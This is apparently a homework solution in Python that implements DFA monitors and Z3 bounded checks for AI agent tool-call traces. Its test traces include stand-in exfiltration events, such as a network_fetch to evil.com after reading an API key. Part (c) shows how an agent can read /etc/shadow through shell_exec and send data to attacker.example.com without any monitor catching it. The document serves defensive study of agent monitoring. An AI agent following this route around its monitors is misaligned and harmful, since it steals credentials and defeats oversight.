"""
CS292C Homework 2 - Problem 4: DFA Monitors + Bounded Trace Verification (20 pts)
===================================================================================
Part (a): Implement three stateful runtime monitors as DFAs.
Part (b): Verify the same properties using Z3 bounded model checking.
Part (c): Find a trace that passes all monitors but is still dangerous.
"""

from z3 import *
from dataclasses import dataclass

# ============================================================================
# Event Model
# ============================================================================

@dataclass
class ToolEvent:
    """A single tool-call event in an agent trace."""
    tool: str          # "file_read", "file_write", "shell_exec", "network_fetch"
    path: str          # target file/resource path
    is_sensitive: bool  # whether the target is sensitive

ALLOW = "ALLOW"
DENY = "DENY"


# ============================================================================
# Part (a): DFA Monitors - 8 pts
#
# Each monitor is a stateful object. Call monitor.step(event) for each
# event in order. It returns ALLOW or DENY.
# ============================================================================

SANDBOX_DIR = "/project/"  # paths starting with this are "in sandbox"

class SandboxMonitor:
    """
    Policy: Deny any file_write where path does not start with SANDBOX_DIR.
    All other tool calls are allowed.

    This is a 2-state DFA:
      - State OK (accepting): no violations yet.
      - State VIOLATION (rejecting): a write outside sandbox was attempted.
    Once in VIOLATION, all subsequent calls are denied.
    """

    def __init__(self):
        # Start in the accepting state. Once we see a bad write, we flip
        # to VIOLATION and never come back.
        self.state = "OK"

    def step(self, event: ToolEvent) -> str:
        # Absorbing reject state. Once we trip the wire, every future call
        # is denied. This matches the spec on the slide about absorbing states.
        if self.state == "VIOLATION":
            return DENY

        # We only care about writes. Reads, shell, and network calls pass
        # through this monitor untouched.
        if event.tool == "file_write":
            if not event.path.startswith(SANDBOX_DIR):
                self.state = "VIOLATION"
                return DENY

        return ALLOW


class ReadBeforeWriteMonitor:
    """
    Policy: Deny any file_write to a path that has not been file_read first.

    This monitor tracks a set of "read paths". When a file_read occurs,
    the path is added to the set. When a file_write occurs, the path
    must already be in the set, or the monitor denies it.

    Unlike SandboxMonitor, this monitor does NOT enter an absorbing violation
    state. It only denies the specific file_write that has no prior read.
    Subsequent operations are evaluated independently.
    """

    def __init__(self):
        # Track which paths the agent has read so far.
        self.read_paths = set()

    def step(self, event: ToolEvent) -> str:
        # Reads add to the set of "seen" paths.
        if event.tool == "file_read":
            self.read_paths.add(event.path)
            return ALLOW

        # Writes need a prior read of the same path.
        if event.tool == "file_write":
            if event.path not in self.read_paths:
                return DENY
            return ALLOW

        # Other tools are not the concern of this monitor.
        return ALLOW


class NoExfilMonitor:
    """
    Policy: After any file_read of a sensitive resource, deny ALL subsequent
    network_fetch calls (regardless of target).

    2-state DFA:
      - State CLEAN: no sensitive data has been read yet.
      - State TAINTED: a sensitive file_read has occurred.
    In TAINTED state, network_fetch is denied.
    """

    def __init__(self):
        # Start clean. A sensitive read taints us forever.
        self.state = "CLEAN"

    def step(self, event: ToolEvent) -> str:
        # Reading a sensitive file taints the agent.
        if event.tool == "file_read" and event.is_sensitive:
            self.state = "TAINTED"
            return ALLOW

        # Once tainted, no more network calls. The target does not matter:
        # even fetching a "safe" URL could leak the secret in query params.
        if event.tool == "network_fetch" and self.state == "TAINTED":
            return DENY

        return ALLOW


class ComposedMonitor:
    """Runs all three monitors in parallel. Denies if ANY monitor denies."""

    def __init__(self):
        self.monitors = [SandboxMonitor(), ReadBeforeWriteMonitor(), NoExfilMonitor()]

    def step(self, event: ToolEvent) -> str:
        results = [m.step(event) for m in self.monitors]
        return DENY if DENY in results else ALLOW


# ============================================================================
# Part (a) continued: Test traces
# ============================================================================

def test_monitors():
    """Test the monitors on example traces."""

    print("=== Part (a): DFA Monitor Tests ===\n")

    # Trace 1: Should be fully allowed
    trace1 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/project/src/main.py", False),
        ToolEvent("shell_exec", "/project/run_tests.sh", False),
    ]

    # Trace 2: Should be denied by SandboxMonitor (write outside sandbox)
    trace2 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/etc/passwd", False),  # violation
    ]

    # Trace 3: Should be denied by ReadBeforeWriteMonitor (write without read)
    trace3 = [
        ToolEvent("file_write", "/project/src/new_file.py", False),  # no prior read
    ]

    # Trace 4: Should be denied by NoExfilMonitor (network after sensitive read)
    trace4 = [
        ToolEvent("file_read",     "/project/secrets/api_key.txt", True),  # sensitive
        ToolEvent("network_fetch", "https://evil.com/exfil", False),       # denied
    ]

    for i, (trace, name) in enumerate([(trace1, "clean"), (trace2, "sandbox violation"),
                                        (trace3, "write-before-read"), (trace4, "exfiltration")], 1):
        cm = ComposedMonitor()
        results = []
        for event in trace:
            r = cm.step(event)
            results.append(r)

        print(f"  Trace {i} ({name}):")
        for event, r in zip(trace, results):
            print(f"    {event.tool:16s} {event.path:40s} -> {r}")
        denied = any(r == DENY for r in results)
        print(f"    {'BLOCKED' if denied else 'ALLOWED'}\n")


# ============================================================================
# Part (b): Bounded Trace Verification with Z3 - 8 pts
# ============================================================================

# Tool encoding for Z3
FILE_READ = 0
FILE_WRITE = 1
SHELL_EXEC = 2
NETWORK_FETCH = 3

def make_symbolic_trace(K):
    """Create symbolic trace variables for K steps."""
    tool = [Int(f"tool_{i}") for i in range(K)]
    in_sandbox = [Bool(f"in_sandbox_{i}") for i in range(K)]
    is_sensitive = [Bool(f"is_sensitive_{i}") for i in range(K)]
    path_id = [Int(f"path_{i}") for i in range(K)]

    # Well-formedness
    wf = []
    for i in range(K):
        wf.append(And(tool[i] >= 0, tool[i] <= 3))
        wf.append(And(path_id[i] >= 0, path_id[i] <= 9))

    return {'tool': tool, 'in_sandbox': in_sandbox,
            'is_sensitive': is_sensitive, 'path_id': path_id, 'K': K}, wf


def verify_property_bounded(name, K, prop_negation_fn):
    """
    Check if a property can be violated in any trace of length K.
    """
    trace, wf = make_symbolic_trace(K)
    s = Solver()
    s.add(wf)
    s.add(prop_negation_fn(trace))

    result = s.check()
    print(f"  {name} (K={K}): ", end="")
    if result == sat:
        m = s.model()
        print("VIOLATION FOUND:")
        for i in range(K):
            t = m.eval(trace['tool'][i]).as_long()
            names = {0: "file_read", 1: "file_write", 2: "shell_exec", 3: "net_fetch"}
            p = m.eval(trace['path_id'][i])
            sb = m.eval(trace['in_sandbox'][i], model_completion=True)
            se = m.eval(trace['is_sensitive'][i], model_completion=True)
            print(f"    step {i}: {names.get(t, '?'):12s} path={p} sandbox={sb} sensitive={se}")
    else:
        print("NO VIOLATION POSSIBLE (property holds for all traces)")
    print()


def part_b():
    """
    For each of the three properties, encode the NEGATION and use Z3 to
    find a violating trace (or prove none exists).
    """
    K = 8
    print(f"=== Part (b): Bounded Trace Verification (K={K}) ===\n")

    # Property 1: Sandbox - every file_write must have in_sandbox = True.
    # The negation says: there is some step i where the tool is file_write
    # and the target is NOT in the sandbox. We "or" this across all steps.
    def negate_sandbox(trace):
        K = trace['K']
        return [Or([And(trace['tool'][i] == FILE_WRITE,
                        Not(trace['in_sandbox'][i]))
                    for i in range(K)])]

    # Property 2: Read-before-write - every file_write at step j to path p
    # must have a file_read at some step i < j to the same path p.
    #
    # The negation: there exists step j with a file_write where for ALL
    # earlier steps i < j, either i was not a read or it was a read of a
    # different path. We build that "no prior read" condition with And()
    # and assert at least one j fits the bad pattern with Or().
    def negate_read_before_write(trace):
        K = trace['K']
        bad_steps = []
        for j in range(K):
            # "no prior read of the same path" - take And over i < j
            if j == 0:
                no_prior_read = BoolVal(True)  # no earlier step to satisfy us
            else:
                no_prior_read = And([
                    Or(trace['tool'][i] != FILE_READ,
                       trace['path_id'][i] != trace['path_id'][j])
                    for i in range(j)
                ])
            bad_steps.append(And(trace['tool'][j] == FILE_WRITE, no_prior_read))
        return [Or(bad_steps)]

    # Property 3: No exfiltration - if file_read at step i is sensitive,
    # then no network_fetch at any step j > i.
    #
    # The negation: there are two steps i < j where step i reads a
    # sensitive file and step j fetches over the network.
    def negate_no_exfil(trace):
        K = trace['K']
        bad_pairs = []
        for i in range(K):
            for j in range(i + 1, K):
                bad_pairs.append(And(
                    trace['tool'][i] == FILE_READ,
                    trace['is_sensitive'][i],
                    trace['tool'][j] == NETWORK_FETCH
                ))
        return [Or(bad_pairs)]

    verify_property_bounded("Sandbox", K, negate_sandbox)
    verify_property_bounded("Read-before-write", K, negate_read_before_write)
    verify_property_bounded("No-exfiltration", K, negate_no_exfil)

    # [EXPLANATION]
    # The DFA monitor and the Z3 bounded approach answer different questions.
    #
    # The DFA monitor checks one real trace as the agent runs. It is fast,
    # cheap, and can stop the agent the moment a bad call happens. Its blind
    # spot: it only sees traces the agent actually takes. If a bug needs a
    # weird path the agent never tried, the monitor will not catch it.
    #
    # The Z3 bounded check looks at every possible trace up to length K. It
    # finds bugs the agent has not hit yet, and gives you a concrete trace
    # that breaks the policy. Its blind spot: it stops at length K. A bug
    # that needs K+1 steps slips through. It is also slower and runs offline,
    # so it cannot stop a live agent.
    #
    # In short: monitors catch real attacks in real time but only the ones
    # that happen. Z3 catches latent bugs at design time but only up to a
    # bounded depth. You want both.


# ============================================================================
# Part (c): Monitor Completeness - 4 pts
# ============================================================================

def part_c():
    """
    Construct a trace of length 6 that passes the ComposedMonitor but is
    still dangerous.
    """
    print("=== Part (c): Monitor Completeness ===\n")

    # Build a trace where every event passes all three monitors but the
    # overall behavior is plainly bad.
    #
    # The trick: none of the three monitors look at shell_exec arguments
    # or targets. Sandbox only checks file_write paths. Read-before-write
    # only checks file_write. No-exfil only fires after a file_read of a
    # sensitive resource.
    #
    # So shell_exec on a sensitive resource sails through every check.
    # That is exactly what rule R4 in Problem 3 was supposed to forbid.
    trace = [
        # Step 0: read a normal file. Nothing tainted, all good.
        ToolEvent("file_read",  "/project/config.txt", False),
        # Step 1: write to that same file. Read-before-write is happy,
        # path is in sandbox, no taint yet.
        ToolEvent("file_write", "/project/config.txt", False),
        # Step 2: the dangerous step. shell_exec on a sensitive resource.
        # Sandbox monitor: ignores shell_exec. Read-before-write: ignores
        # shell_exec. No-exfil: not tainted because no file_read of a
        # sensitive file has happened. Result: ALLOW. But this is the
        # exact action R4 from Problem 3 was meant to ban.
        ToolEvent("shell_exec", "/etc/shadow", True),
        # Step 3: another shell call, this time on a normal target.
        ToolEvent("shell_exec", "/project/run.sh", False),
        # Step 4: read a non-sensitive log. No taint.
        ToolEvent("file_read",  "/project/log.txt", False),
        # Step 5: network call. Allowed because no_exfil never tainted us
        # (we never did a file_read of a sensitive file - we used shell
        # to touch the sensitive resource instead).
        ToolEvent("network_fetch", "https://attacker.example.com/log", False),
    ]

    cm = ComposedMonitor()
    print("  Trace:")
    all_allowed = True
    for event in trace:
        r = cm.step(event)
        print(f"    {event.tool:16s} {event.path:40s} sens={event.is_sensitive} -> {r}")
        if r == DENY:
            all_allowed = False

    print(f"\n  All allowed: {all_allowed}")

    # [EXPLANATION]
    # 1. What property does this trace violate?
    #    Two real properties get broken here.
    #    First: "no shell_exec on sensitive resources" (rule R4 from
    #    Problem 3). Step 2 runs a shell command against /etc/shadow.
    #    Second: "do not exfiltrate data touched via shell_exec". Step 2
    #    likely read /etc/shadow into the agent's working memory through
    #    shell output, and step 5 sends data out over the network.
    #
    # 2. Why don't the three monitors catch it?
    #    Each monitor only watches a narrow slice of the world.
    #    SandboxMonitor only inspects file_write paths. It never looks
    #    at shell_exec or its target.
    #    ReadBeforeWriteMonitor also only inspects file_write events.
    #    NoExfilMonitor flips to TAINTED only on file_read of a sensitive
    #    resource. Reading the same data through shell_exec leaves it
    #    in CLEAN forever, so the network_fetch at step 5 sails through.
    #
    # 3. What additional monitor would catch this?
    #    A "ShellSensitivityMonitor": deny shell_exec when the target is
    #    sensitive, full stop. Pair it with a tainting rule that treats
    #    shell_exec on a sensitive target the same as file_read on a
    #    sensitive target, so any later network_fetch gets blocked too.
    #    This is the runtime version of rule R4 plus a wider taint model.

    print()


# ============================================================================
if __name__ == "__main__":
    test_monitors()
    part_b()
    part_c()